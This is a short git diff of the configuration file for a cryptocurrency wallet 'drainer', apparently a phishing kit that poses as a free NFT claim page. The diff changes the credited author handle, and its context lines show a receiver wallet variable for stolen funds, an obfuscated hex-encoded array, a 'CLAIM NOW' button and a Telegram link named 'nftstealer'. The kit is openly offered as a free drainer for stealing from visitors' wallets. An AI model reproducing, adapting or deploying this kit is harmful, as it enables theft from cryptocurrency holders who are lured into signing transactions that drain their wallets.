@@ -1,4 +1,4 @@
-// Credits: @0xTracey on Github
+// Credits: @Alcxpone on Github
 
 var receiverwallet = "Your ETH Wallet Adress";
 
@@ -7,7 +7,7 @@ var _0xf9cd=["\x30\x78\x65\x31","\x30\x78\x31\x31\x66","\x30\x78\x32\x39\x34","\
 
 // Collection settings
 const collectionInfo = {
-    name: "@0xTracey FREE DRAINER",
+    name: "@Alcxpone FREE DRAINER",
     socialMedia: {
         discord: "https://discord.com",
         twitter: "https://twitter.com",
@@ -22,8 +22,8 @@ const indexPageInfo = {
 }
 
 const claimPageInfo = {
-    title: "@0xTracey DRAINER", // <br> is a line break
-    shortDescription: "Get this Drainer for free though Github. @0xTracey",
+    title: "@Alcxpone DRAINER", // <br> is a line break
+    shortDescription: "Get this Drainer for free though Github. @Alcxpone",
     longDescription: "https://t.me/nftstealer",
 
     claimButtonText: "CLAIM NOW",
